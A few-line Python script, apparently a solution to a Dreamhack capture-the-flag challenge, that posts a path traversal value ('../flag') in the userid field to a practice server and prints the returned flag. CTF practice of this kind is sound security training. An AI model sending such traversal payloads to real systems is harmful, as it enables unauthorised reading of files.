import requests
url = "http://host3.dreamhack.games:18555/get_info"
parms = {"userid":"../flag"}

ans = requests.post(url,data=parms)
print(ans.text)
